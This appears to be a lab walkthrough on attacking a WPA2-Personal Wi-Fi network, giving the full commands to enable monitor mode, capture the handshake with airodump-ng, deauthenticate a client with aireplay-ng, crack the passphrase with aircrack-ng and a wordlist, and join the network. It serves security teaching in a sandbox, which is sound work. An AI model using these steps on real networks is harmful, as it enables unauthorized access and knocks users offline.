On our current SSH session, run the command `iw dev`. This will show any wireless devices and their configuration that we have available for us to use.

Terminal

```shell
glitch@wifi:~$ iw dev
phy#2
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm                                                                             
```

The device/interface `wlan2` is available to us, and there are two important details to take away from this output that will be useful to us:

1. The `addr` is the **MAC/BSSID** of our device. BSSID stands for Basic Service Set Identifier, and it's a unique identifier for a wireless device or access point's physical address.
2. The `type` is shown as **managed**. This is the standard mode used by most Wi-Fi devices (like laptops, phones, etc.) to connect to Wi-Fi networks. In managed mode, the device acts as a client, connecting to an access point to join a network. There is another mode called **monitor**, which we will discuss shortly.

Now, we would like to scan for nearby Wi-Fi networks using our `wlan2` device. We can use `sudo iw dev wlan2 scan`. The `dev wlan2` specifies the wireless device you want to work with, and `scan` tells **iw** to scan the area for available Wi-Fi networks.

Terminal

```shell
glitch@wifi:~$ sudo iw dev wlan2 scan

```

There is a lot of information to dissect here, but here are the most important details that indicate this device is an access point:

- The **BSSID** and **SSID** of the device are `02:00:00:00:00:00` and `MalwareM_AP` respectively. Since the SSID is shown, this means the device is advertising a network name, which access points do to allow clients to discover and connect to the network.
- The presence of **RSN (Robust Security Network)** indicates the network is using WPA2, as RSN is a part of the WPA2 standard. WPA2 networks typically use RSN to define the encryption and authentication settings.
- The `Group and Pairwise ciphers` are **CCMP**. Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP) is the encryption method used by WPA2.
- The `Authentication suites` value inside RSN is **PSK** indicating that this is a WPA2-Personal network, where a shared password is used for authentication.
- Another important detail is the `DS Parameter set` value, which shows **channel 6**. The channel, in terms of Wi-Fi, refers to a specific frequency range within the broader Wi-Fi spectrum that allows wireless devices to communicate with each other. There are various Wi-Fi channels, and they all help distribute network traffic across various frequency ranges, which reduces interference. The two most common Wi-Fi channels are 2.4 GHz and 5GHz. In the 2.4 GHz band, channels 1, 6, and 11 are commonly used because they don’t overlap, minimising interference. In the 5 GHz band, there are many more channels available, allowing more networks to coexist without interference.

Now will be a good time to discuss another type that we can use on some wireless devices: **monitor** mode. This is a special mode primarily used for network analysis and security auditing. In this mode, the Wi-Fi interface listens to all wireless traffic on a specific channel, regardless of whether it is directed to the device or not. It passively captures all network traffic within range for analysis without joining a network. We want to check if our `wlan2` interface can use monitor mode. To achieve this, we will run the command `sudo ip link set dev wlan2 down` to turn our device off. Then we will switch modes with `sudo iw dev wlan2 set type monitor` to change wlan2 to monitor mode. Then turn our device back on with `sudo ip link set dev wlan2 up`.

Terminal

```shell
glitch@wifi:~$ sudo ip link set dev wlan2 down
glitch@wifi:~$ sudo iw dev wlan2 set type monitor
glitch@wifi:~$ sudo ip link set dev wlan2 up
```

We can confirm that our interface is in monitor mode with the command `sudo iw dev wlan2 info`.

Terminal

```shell
glitch@wifi:~$ sudo iw dev wlan2 info
Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	type monitor
	wiphy 2
	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
	txpower 20.00 dBm
```

Now, let us create one more SSH session. We want to have **2 separate terminals** in order to see clearly how the attack works. You can align the SSH terminals however you like, but here is an example of how it should look like.

On the first terminal, we start by capturing Wi-Fi traffic in the area, specifically targeting the WPA handshake packets. We can do this with the command `sudo airodump-ng wlan2`. This command provides a list of nearby Wi-Fi networks (SSIDs) and shows important details like signal strength, channel, and encryption type. This information is already known to us from our previous commands.

**Note:** By default, `airodump-ng` will automatically switch the selected wireless interface into monitor mode if the interface supports it.

Terminal

```shell
glitch@wifi:~$ sudo airodump-ng wlan2
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP                                                                              
```

The output reveals the information we already knew before, such as the BSSID, SSID, and the channel. However, in this particular output, we are also given the channel where our target SSID is listening (channel 6). Now, we will focus on the **MalwareM_AP** access point and capture the WPA handshake; this is crucial for the PSK (password) cracking process.

First, in the current terminal, let us cancel **airodump-ng** using `CTRL+C` and then execute the command `sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2`. This command targets the specific network channel and MAC address (BSSID) of the access point for which you want to capture the traffic and saves the information to a few files that start with the name output-file. These files will be used to crack the PSK. The ultimate goal of this command is to capture the 4-way handshake. It will first check for any clients that may be connected to the access point. If a client is already connected, then we can perform a deauthentication attack; otherwise, for any new client that connects, we will capture the 4-way handshake. In this particular scenario, a client is already connected. The output will look the same at first until we receive the information about the connected client, which will be displayed at the bottom of our output. It is important to leave this **command running** until we are done with the attack.

Terminal

```shell
glitch@wifi:~$ sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

It should take between **1 to 5 minutes** before receiving the client information. In our case, it will show like this:

Terminal

```shell
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140
```

Note that the `STATION` section shows the device's BSSID (MAC) of `02:00:00:00:01:00` that is connected to the access point. This is the connection that we will be attacking. Now we are ready for the next step.

On the second terminal, we will launch the deauthentication attack. Because the client is already connected, we want to force them to reconnect to the access point, forcing it to send the handshake packets. We can break this down into 3 simple steps:

1. **Deauthentication packets:** The tool aireplay-ng sends deauthentication packets to either a specific client (targeted attack) or to all clients connected to an access point (broadcast attack). These packets are essentially "disconnect" commands that force the client to drop its current Wi-Fi connection.
2. **Forcing a reconnection:** When the client is disconnected, it automatically tries to reconnect to the Wi-Fi network. During this reconnection, the client and access point perform the 4-way handshake as part of the reauthentication process.
3. **Capturing the handshake:** This is where airodump-ng comes into play because it will capture this handshake as it happens, providing the data needed to attempt the WPA/WPA2 cracking.

We can do this with `sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`. The `-0` flag indicates that we are using the deauthentication attack, and the `1` value is the number of deauths to send. The `-a` indicates the BSSID of the access point and `-c` indicates the BSSID of the client to deauthenticate.

Terminal

```shell
glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
19:29:37  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
19:29:38  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

Now, if we look back on our first terminal, we will see the WPA handshake shown on the top-right of our output as `WPA handshake: 02:00:00:00:00:00`. All of this information is being saved into our output files.

Terminal

```shell
 CH  6 ][ Elapsed: 1 min ][ 2024-11-02 19:30 ][ WPA handshake: 02:00:00:00:00:00 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140  EAPOL
```

In the second terminal, we can use the captured WPA handshake to attempt to crack the WPA/WP2 passphrase. We will be performing a dictionary attack in order to match the passphrase against each entry in a specified wordlist file. A shortened version of the infamous `rockyou.txt` wordlist has already been provided for us to use. This is located in the `/home/glitch/` directory. If the passphrase is weak and appears in the wordlist, it will eventually be cracked. The command `sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap` will do this for us where the `-a 2` flag indicates the WPA/WPA2 attack mode. The `-b` indicates the BSSID of the access point, and the `-w` flag indicates the dictionary list to use for the attack. Finally, we select the output files that we will be using, which contain the 4-way handshake that we will be cracking.

Terminal

```shell
glitch@wifi:~$ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap

```

**Note:** If you get an `Packets contained no EAPOL data; unable to process this AP` error, this means that you ran aircrack-ng prior to the handshake being captured or that the handshake was not captured at all. If that's the case, then re-do all of the steps in order to capture the `WPA handshake`.

With the PSK, we can now join the **MalwareM_AP** access point. In a typical engagement, we would do this to inspect the new network, or in some cases, joining the access point is enough to show impact. First, press `CTRL+C` on the terminal that has `airodump-ng` running in order to stop the **airodump-ng** process. We do this because we will not be able to join the Wi-Fi network while airodump-ng is running due to the fact that we are actively using the interface in monitor mode. Then execute the following commands:

Terminal

```shell
glitch@wifi:~$ wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2
```

**Note:** If you get a `rfkill: Cannot get wiphy information` error, you can ignore it. You will also notice that `wpa_supplicant` has automatically switched our **wlan2** interface to **managed mode**.

Giving it about **10 seconds** and checking the wireless interfaces once again with `iw dev` shows that we have joined the **MalwareM_AP** SSID.

Terminal

```shell
glitch@wifi:~$ iw dev
phy#2
